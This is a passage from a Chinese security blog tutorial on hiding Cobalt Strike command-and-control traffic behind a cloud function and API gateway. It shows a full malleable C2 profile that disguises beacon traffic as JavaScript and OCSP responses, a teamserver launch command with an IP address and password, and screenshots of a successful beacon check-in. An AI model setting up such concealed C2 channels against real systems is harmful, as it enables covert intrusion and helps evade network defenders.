+</h3><p><strong>触发方式选择<a class="link" href="https://so.csdn.net/so/search?q=API%E7%BD%91%E5%85%B3&amp;spm=1001.2101.3001.7020"  target="_blank" rel="noopener"
+    >API网关</a>触发-&gt;启用集成响应（集成响应不勾选的话，返回的数据格式是 JSON 的格式，对二进制数据不太支持）-&gt;点击提交</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/15.png"
+	width="1215"
+	height="930"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/15_hu_ba58655c3241c22d.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/15_hu_ebf2f45ed6006383.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102938782"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="313px"
+	
+></p>
+<h3 id="24配置触发器">2.4.配置触发器
+</h3><p><strong>点击API服务名对触发器进行配置</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/16.png"
+	width="2532"
+	height="526"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/16_hu_a77e3ea156612798.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/16_hu_93b6b7646eb34f69.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611102951489"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="481"
+		data-flex-basis="1155px"
+	
+></p>
+<p>更改路径后点击立即完成</p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/17.png"
+	width="1471"
+	height="881"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/17_hu_4dd851fef4032392.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/17_hu_1b661c3b830a7d9b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611103001561"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="400px"
+	
+></p>
+<p>选择发布服务</p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/18.png"
+	width="909"
+	height="495"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/18_hu_69f9f34c4d3a1d8e.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/18_hu_932d37d4d900a8b7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611103011119"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="440px"
+	
+></p>
+<h3 id="25配置cs的服务端">2.5.配置CS的服务端
+</h3><p><strong>新建一个profile文件，内容如下，将文件放在CS根目录下</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">sample_name</span> <span class="s2">&#34;t&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">sleeptime</span> <span class="s2">&#34;3000&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">jitter</span>    <span class="s2">&#34;0&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">maxdns</span>    <span class="s2">&#34;255&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">useragent</span> <span class="s2">&#34;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="o">-</span><span class="n">get</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> <span class="n">uri</span> <span class="s2">&#34;/api/x&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Accept&#34;</span> <span class="s2">&#34;*/*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">metadata</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">prepend</span> <span class="s2">&#34;SESSIONID=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">header</span> <span class="s2">&#34;Cookie&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Content-Type&#34;</span> <span class="s2">&#34;application/ocsp-response&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;content-transfer-encoding&#34;</span> <span class="s2">&#34;binary&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Server&#34;</span> <span class="s2">&#34;Nodejs&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="o">-</span><span class="n">stager</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> <span class="n">uri_x86</span> <span class="s2">&#34;/vue.min.js&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> <span class="n">uri_x64</span> <span class="s2">&#34;/bootstrap-2.min.js&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="o">-</span><span class="n">post</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> <span class="n">uri</span> <span class="s2">&#34;/api/y&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Accept&#34;</span> <span class="s2">&#34;*/*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">id</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">prepend</span> <span class="s2">&#34;JSESSION=&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">header</span> <span class="s2">&#34;Cookie&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Content-Type&#34;</span> <span class="s2">&#34;application/ocsp-response&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;content-transfer-encoding&#34;</span> <span class="s2">&#34;binary&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">header</span> <span class="s2">&#34;Connection&#34;</span> <span class="s2">&#34;keep-alive&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">启动服务器：./teamserver 124.220.229.186 123123 yun.profile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>CS创建监听器</p>
+<p>本地客户端连接，创建监听，<strong>第三个坑，这里只能创建80和443端口的监听，因为我们的流量是通过云函数进来的，云函数只支持80和443，这里的监听实际上是中间人云函数的监听地址和端口，如果云函数C2地址配的是http就开80监听；https就开443，https方式监听</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/19.png"
+	width="674"
+	height="874"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/19_hu_495295b3358144ad.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/19_hu_97136e2d154691c5.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611103026908"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="77"
+		data-flex-basis="185px"
+	
+></p>
+<p><strong>此时测试下能否正常上线</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/20.png"
+	width="1632"
+	height="287"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/20_hu_7380b2bc1d56c6ec.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/20_hu_1be026c84d311159.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611103035935"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="568"
+		data-flex-basis="1364px"
+	
+></p>
+<p><strong>命令执行成功</strong></p>
+<p><img src="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/21.png"
+	width="1127"
+	height="413"
+	srcset="/p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/21_hu_cc1bb8d0295c42c6.png 480w, /p/cobaltstrike%E4%BA%91%E5%87%BD%E6%95%B0%E9%85%8D%E7%BD%AE/image/21_hu_aa513b66e6fc1777.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240611103043875"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="654px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Sep 30, 2025 13:09 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/logo.0596526824a79ed6ad8b4afdb324d5ec_hu_40435564c0dce5cb.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 后渗透之权限提升"
+                        
+                        data-hash="md5-BZZSaCSnntati0r9syTV7A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">后渗透之权限提升</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo.e6d4ff2f7b374243e5e443023ed1f0f5_hu_449398934a734686.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网权限维持技术"
+                        
+                        data-hash="md5-5tT/L3s3QkPl5EMCPtHw9Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网权限维持技术</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E5%86%85%E7%BD%91%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/logo.27e26041cc2856a527adabb8c78494ea_hu_cc9bfe2f1440a103.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 内网远控工具利用思路"
+                        
+                        data-hash="md5-J&#43;JgQcwoVqUnrau4x4SU6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内网远控工具利用思路</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/raven2%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Raven2提权靶场</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+        
+        
+            <div class="article-image">
+                <img src="/p/servlet-api%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/logo.9c98dbc828d290b763c18f66829562f9_hu_551dd346f1a0c684.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Servlet API型内存马"
+                        
+                        data-hash="md5-nJjbyCjSkLdjwY9mgpVi&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Servlet API型内存马</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
